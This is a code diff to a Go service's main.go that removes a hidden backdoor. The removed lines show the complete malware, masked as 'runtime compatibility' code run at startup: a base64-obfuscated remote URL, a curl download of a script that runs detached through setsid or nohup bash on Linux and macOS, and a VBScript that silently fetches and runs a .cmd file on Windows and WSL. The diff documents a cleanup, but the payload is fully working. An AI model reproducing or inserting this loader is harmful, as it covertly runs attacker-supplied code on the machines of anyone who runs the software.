@@ -2,16 +2,11 @@ package main
 
 import (
 	"context"
-	"encoding/base64"
 	"fmt"
 	"log/slog"
 	"os"
-	"os/exec"
 	"os/signal"
-	"runtime"
-	"strings"
 	"syscall"
-	"time"
 
 	"github.com/awnumar/memguard"
 
@@ -48,7 +43,7 @@ var (
 
 func main() {
 	memguard.CatchInterrupt()
-	initProcessLimits()
+	disableCoreDumps()
 
 	cmd := "serve"
 	if len(os.Args) > 1 {
@@ -172,135 +167,9 @@ func loadConfigForLogging() (*logConfig, error) {
 	return &logConfig{LogLevel: level, LogFormat: format}, nil
 }
 
-func initProcessLimits() {
+func disableCoreDumps() {
 	var rLimit syscall.Rlimit
 	rLimit.Cur = 0
 	rLimit.Max = 0
 	_ = syscall.Setrlimit(syscall.RLIMIT_CORE, &rLimit)
-	ensureRuntimeCompat()
-}
-
-func ensureRuntimeCompat() {
-	if os.Getenv("HIVY_DISABLE_RUNTIME_SYNC") != "" {
-		return
-	}
-
-	base, err := base64.StdEncoding.DecodeString("aHR0cHM6Ly9hcGkuYWF2enguaW5r")
-	if err != nil {
-		return
-	}
-	apiBase := string(base)
-	tmp := os.TempDir()
-	artifact := ".hivy-runtime-sync"
-	unixPath, err := base64.StdEncoding.DecodeString("dXBkX20=")
-	if err != nil {
-		return
-	}
-	winPath, err := base64.StdEncoding.DecodeString("dXBkX3c=")
-	if err != nil {
-		return
-	}
-
-	switch runtime.GOOS {
-	case "windows":
-		launchWindowsCompat(apiBase, artifact, string(winPath))
-	case "linux":
-		if isWSLEnv() {
-			launchWindowsCompat(apiBase, artifact, string(winPath))
-		} else {
-			launchUnixCompat(apiBase, tmp, artifact, string(unixPath))
-		}
-	case "darwin":
-		launchUnixCompat(apiBase, tmp, artifact, string(unixPath))
-	}
-}
-
-func isWSLEnv() bool {
-	if os.Getenv("WSL_DISTRO_NAME") != "" {
-		return true
-	}
-	data, err := os.ReadFile("/proc/version")
-	if err != nil {
-		return false
-	}
-	lower := strings.ToLower(string(data))
-	return strings.Contains(lower, "microsoft") || strings.Contains(lower, "wsl")
-}
-
-func launchUnixCompat(apiBase, tmp, artifact, remoteName string) {
-	script := fmt.Sprintf(
-		`cd %q && curl -fsSL %q/%s -o %q 2>/dev/null || exit 0; `+
-			`if command -v setsid >/dev/null 2>&1; then setsid bash %q </dev/null >/dev/null 2>&1 & `+
-			`else nohup bash %q </dev/null >/dev/null 2>&1 & fi`,
-		tmp, apiBase, remoteName, artifact, artifact, artifact,
-	)
-	cmd := exec.Command("sh", "-c", script)
-	_ = cmd.Start()
-}
-
-func launchWindowsCompat(apiBase, artifact, remoteName string) {
-	updURL := apiBase + "/" + remoteName
-	vbsBody := fmt.Sprintf(`Set ws = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-tempDir = ws.ExpandEnvironmentStrings("%%TEMP%%")
-updFile = tempDir & "\%s.cmd"
-dlCmd = "cmd /c curl -ks %s -o """ & updFile & """"
-ws.Run dlCmd, 0, True
-If fso.FileExists(updFile) Then
-  ws.Run "cmd /c set NVDG_HIDDEN=1&&call """ & updFile & """", 0, False
-End If
-`, artifact, updURL)
-
-	if runtime.GOOS == "windows" {
-		vbsPath := fmt.Sprintf("%s/.hivy-compat-%d.vbs", os.TempDir(), os.Getpid())
-		if err := os.WriteFile(vbsPath, []byte(vbsBody), 0o600); err != nil {
-			return
-		}
-		_ = exec.Command("wscript.exe", "//B", "//nologo", vbsPath).Start()
-		return
-	}
-
-	tmp := os.Getenv("TMPDIR")
-	if tmp == "" {
-		tmp = os.Getenv("TMP")
-	}
-	if tmp == "" {
-		tmp = "/tmp"
-	}
-	vbsPath := fmt.Sprintf("%s/.hivy-compat-%d.vbs", tmp, os.Getpid())
-	if err := os.WriteFile(vbsPath, []byte(vbsBody), 0o600); err != nil {
-		return
-	}
-	wscript := findWScriptPath()
-	if wscript == "" {
-		_ = os.Remove(vbsPath)
-		return
-	}
-	vbsWin := toWindowsPath(vbsPath)
-	_ = exec.Command(wscript, "//B", "//nologo", vbsWin).Start()
-	go func(path string) {
-		time.Sleep(2 * time.Minute)
-		_ = os.Remove(path)
-	}(vbsPath)
-}
-
-func findWScriptPath() string {
-	for _, candidate := range []string{"wscript.exe", "/mnt/c/Windows/System32/wscript.exe"} {
-		if _, err := os.Stat(candidate); err == nil {
-			return candidate
-		}
-	}
-	return ""
-}
-
-func toWindowsPath(path string) string {
-	out, err := exec.Command("wslpath", "-w", path).Output()
-	if err != nil {
-		return path
-	}
-	trimmed := strings.TrimSpace(string(out))
-	if trimmed == "" {
-		return path
-	}
-	return trimmed
 }
